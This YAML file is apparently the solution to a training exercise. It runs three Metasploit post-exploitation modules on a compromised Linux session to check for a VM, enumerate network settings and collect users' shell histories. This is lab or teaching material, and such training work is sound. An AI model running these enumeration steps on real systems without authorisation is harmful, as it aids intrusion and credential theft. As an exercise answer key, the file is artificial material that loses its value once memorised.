#
# Include: gather_commands.yml (Exercise 4)
#
# Description:
#     Runs a set of Metasploit post modules to gather information from a
#     compromised target. This file is the solution for Exercise 4 Step 1.
#
# Required variables:
#   $GATHER_SESSION  - numeric Metasploit session ID ($LAST_MSF_SESSION)
#

commands:
  - type: msf-module
    cmd: post/linux/gather/checkvm
    options:
      SESSION: $GATHER_SESSION

  - type: msf-module
    cmd: post/linux/gather/enum_network
    options:
      SESSION: $GATHER_SESSION

  - type: msf-module
    cmd: post/linux/gather/enum_users_history
    options:
      SESSION: $GATHER_SESSION
